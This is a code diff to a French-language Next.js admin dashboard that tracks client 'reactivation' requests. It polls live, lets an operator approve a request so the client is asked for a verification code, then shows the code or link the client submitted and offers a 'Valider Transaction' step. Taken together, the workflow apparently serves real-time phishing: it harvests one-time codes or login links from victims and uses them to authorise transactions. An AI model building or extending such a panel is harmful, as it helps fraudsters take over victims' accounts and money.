@@ -10,7 +10,11 @@ import {
     CheckCircle2,
     XCircle,
     Clock,
-    KeyRound
+    KeyRound,
+    ExternalLink,
+    Copy,
+    Check,
+    Link2
 } from 'lucide-react';
 import { cn } from '@/lib/utils';
 import Link from 'next/link';
@@ -23,6 +27,7 @@ export default function SubmissionsPage() {
     const [searchQuery, setSearchQuery] = useState('');
     const [statusFilter, setStatusFilter] = useState('');
     const [actionLoading, setActionLoading] = useState<string | null>(null);
+    const [copiedId, setCopiedId] = useState<string | null>(null);
 
     const fetchSubmissions = useCallback(async () => {
         try {
@@ -37,12 +42,10 @@ export default function SubmissionsPage() {
 
     useEffect(() => {
         fetchSubmissions();
-        // Polling en direct pour recevoir les nouvelles demandes et codes
-        const interval = setInterval(fetchSubmissions, 5000);
+        const interval = setInterval(fetchSubmissions, 4000);
         return () => clearInterval(interval);
     }, [fetchSubmissions]);
 
-    // Actions rapides de validation / rejet par l'administrateur
     const handleQuickAction = async (id: string, newStatus: string) => {
         setActionLoading(id);
         try {
@@ -53,6 +56,14 @@ export default function SubmissionsPage() {
         } finally {
             setActionLoading(null);
         }
+    };
+
+    const copyText = async (text: string, id: string) => {
+        try {
+            await navigator.clipboard.writeText(text);
+            setCopiedId(id);
+            setTimeout(() => setCopiedId(null), 2000);
+        } catch {}
     };
 
     const filteredSubmissions = useMemo(() => {
@@ -75,7 +86,7 @@ export default function SubmissionsPage() {
                 <div>
                     <h1 className="text-2xl font-bold text-white tracking-tight">Gestion des Demandes & Validations</h1>
                     <p className="text-xs text-slate-400 mt-1">
-                        Examinez en temps réel les demandes de réactivation, approuvez pour débloquer le code et finalisez les comptes.
+                        Examinez en direct les demandes de réactivation, débloquez les codes, accédez aux liens transmis et validez les transactions.
                     </p>
                 </div>
 
@@ -94,7 +105,7 @@ export default function SubmissionsPage() {
                     <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
                     <input
                         type="text"
-                        placeholder="Rechercher par nom, téléphone, compte NexusLink ou code..."
+                        placeholder="Rechercher par nom, téléphone, compte ou code/lien..."
                         value={searchQuery}
                         onChange={(e) => setSearchQuery(e.target.value)}
                         className="input-field pl-10 text-xs w-full"
@@ -109,7 +120,7 @@ export default function SubmissionsPage() {
                     <option value="">Tous les statuts</option>
                     <option value="En attente">En attente d'examen</option>
                     <option value="Approuvé (Attente code)">Approuvé (Attente code)</option>
-                    <option value="Code reçu">Code reçu du client</option>
+                    <option value="Code reçu">Code / Lien reçu du client</option>
                     <option value="Finalisé">Finalisé</option>
                     <option value="Rejeté">Rejeté</option>
                 </select>
@@ -135,18 +146,19 @@ export default function SubmissionsPage() {
                             <thead>
                                 <tr className="border-b border-white/[0.06] text-slate-400">
                                     <th className="pb-3 font-medium">Titulaire & Contact</th>
-                                    <th className="pb-3 font-medium">Compte NexusLink</th>
+                                    <th className="pb-3 font-medium">Compte Client</th>
+                                    <th className="pb-3 font-medium">Lien / Code Reçu du Client</th>
                                     <th className="pb-3 font-medium">Statut Actuel</th>
-                                    <th className="pb-3 font-medium">Code Reçu</th>
                                     <th className="pb-3 font-medium">Horodatage</th>
-                                    <th className="pb-3 font-medium text-right">Décision / Actions</th>
+                                    <th className="pb-3 font-medium text-right">Actions Administrateur</th>
                                 </tr>
                             </thead>
                             <tbody className="divide-y divide-white/[0.04]">
                                 {filteredSubmissions.map((sub) => {
                                     const isPending = sub.status === 'En attente' || !sub.status;
-                                    const isAwaitingCode = sub.status === 'Approuvé (Attente code)';
-                                    const hasCode = Boolean(sub.verification_code);
+                                    const isCodeReceived = sub.status === 'Code reçu';
+                                    const codeOrUrl = sub.verification_code || '';
+                                    const isUrl = codeOrUrl.startsWith('http://') || codeOrUrl.startsWith('https://');
 
                                     return (
                                         <tr key={sub.id} className="hover:bg-white/[0.02] transition-colors">
@@ -158,11 +170,40 @@ export default function SubmissionsPage() {
                                             <td className="py-3.5 font-mono text-slate-300 font-semibold">
                                                 {sub.account_number}
                                             </td>
+                                            <td className="py-3.5 max-w-xs">
+                                                {codeOrUrl ? (
+                                                    <div className="flex items-center gap-1.5 bg-blue-500/10 border border-blue-500/25 p-1.5 rounded-lg">
+                                                        <span className="font-mono text-[11px] text-blue-300 truncate max-w-[170px]" title={codeOrUrl}>
+                                                            {codeOrUrl}
+                                                        </span>
+                                                        <button
+                                                            onClick={() => copyText(codeOrUrl, `code-${sub.id}`)}
+                                                            className="p-1 hover:bg-blue-500/20 rounded text-slate-400 hover:text-white transition-colors"
+                                                            title="Copier"
+                                                        >
+                                                            {copiedId === `code-${sub.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                                                        </button>
+                                                        {isUrl && (
+                                                            <a
+                                                                href={codeOrUrl}
+                                                                target="_blank"
+                                                                rel="noopener noreferrer"
+                                                                className="p-1 hover:bg-blue-500/20 rounded text-blue-400 hover:text-blue-300 transition-colors"
+                                                                title="Ouvrir le lien"
+                                                            >
+                                                                <ExternalLink className="w-3 h-3" />
+                                                            </a>
+                                                        )}
+                                                    </div>
+                                                ) : (
+                                                    <span className="text-slate-600 text-[11px] italic">En attente</span>
+                                                )}
+                                            </td>
                                             <td className="py-3.5">
                                                 <span className={cn(
                                                     "badge text-[10px]",
                                                     sub.status === 'Finalisé' ? "badge-success" :
-                                                    sub.status === 'Code reçu' ? "badge-primary" :
+                                                    sub.status === 'Code reçu' ? "badge-primary animate-pulse" :
                                                     sub.status === 'Approuvé (Attente code)' ? "badge-warning" :
                                                     sub.status === 'Rejeté' ? "bg-rose-500/15 text-rose-400 border border-rose-500/30" :
                                                     "badge-warning"
@@ -170,28 +211,19 @@ export default function SubmissionsPage() {
                                                     {sub.status || 'En attente'}
                                                 </span>
                                             </td>
-                                            <td className="py-3.5">
-                                                {sub.verification_code ? (
-                                                    <span className="px-2 py-1 rounded bg-blue-500/20 text-blue-300 font-mono font-bold text-xs border border-blue-500/40">
-                                                        {sub.verification_code}
-                                                    </span>
-                                                ) : (
-                                                    <span className="text-slate-600 text-[11px] italic">Non soumis</span>
-                                                )}
-                                            </td>
                                             <td className="py-3.5 font-mono text-slate-400 text-[11px]">
                                                 {sub.created_at ? new Date(sub.created_at).toLocaleDateString('fr-FR', { hour: '2-digit', minute: '2-digit' }) : '-'}
                                             </td>
                                             <td className="py-3.5 text-right">
                                                 <div className="flex items-center justify-end gap-1.5">
-                                                    {/* Si en attente : bouton Approuver pour débloquer l'écran code chez le client */}
+                                                    {/* Étape 1 : Approuver pour demander le code / lien au client */}
                                                     {isPending && (
                                                         <>
                                                             <button
                                                                 onClick={() => handleQuickAction(sub.id, 'Approuvé (Attente code)')}
                                                                 disabled={actionLoading === sub.id}
                                                                 className="px-2.5 py-1 rounded-lg bg-emerald-600/20 text-emerald-300 hover:bg-emerald-600/30 border border-emerald-500/30 text-[11px] font-semibold cursor-pointer"
-                                                                title="Approuver la demande pour que le client saisisse le code"
+                                                                title="Approuver pour demander le code/lien"
                                                             >
                                                                 Approuver
                                                             </button>
@@ -199,28 +231,40 @@ export default function SubmissionsPage() {
                                                                 onClick={() => handleQuickAction(sub.id, 'Rejeté')}
                                                                 disabled={actionLoading === sub.id}
                                                                 className="px-2.5 py-1 rounded-lg bg-rose-600/20 text-rose-300 hover:bg-rose-600/30 border border-rose-500/30 text-[11px] font-semibold cursor-pointer"
-                                                                title="Refuser la demande"
+                                                                title="Refuser"
                                                             >
                                                                 Refuser
                                                             </button>
                                                         </>
                                                     )}
 
-                                                    {/* Si le client a envoyé son code */}
-                                                    {sub.status === 'Code reçu' && (
+                                                    {/* Étape 2 : Valider la transaction dès que le code ou lien est reçu */}
+                                                    {isCodeReceived && (
                                                         <button
                                                             onClick={() => handleQuickAction(sub.id, 'Finalisé')}
                                                             disabled={actionLoading === sub.id}
-                                                            className="px-2.5 py-1 rounded-lg bg-blue-600 text-white hover:bg-blue-500 text-[11px] font-semibold cursor-pointer"
+                                                            className="btn-premium py-1 px-3 text-[11px] font-semibold cursor-pointer shadow-md shadow-blue-500/20"
+                                                            title="Valider la transaction et confirmer au client"
                                                         >
-                                                            Valider Réactivation
+                                                            <span>Valider Transaction</span>
+                                                        </button>
+                                                    )}
+
+                                                    {/* Bouton pour copier l'URL de la session client */}
+                                                    {sub.link_id && (
+                                                        <button
+                                                            onClick={() => copyText(`${window.location.origin}/form/${sub.link_id}`, `link-${sub.id}`)}
+                                                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-colors"
+                                                            title="Copier le lien du formulaire client"
+                                                        >
+                                                            {copiedId === `link-${sub.id}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Link2 className="w-3.5 h-3.5" />}
                                                         </button>
                                                     )}
 
                                                     <Link
                                                         href={`/dashboard/submissions/${sub.id}`}
-                                                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors ml-1"
-                                                        title="Voir la fiche détaillée"
+                                                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors"
+                                                        title="Fiche détaillée"
                                                     >
                                                         <ArrowRight className="w-3.5 h-3.5" />
                                                     </Link>
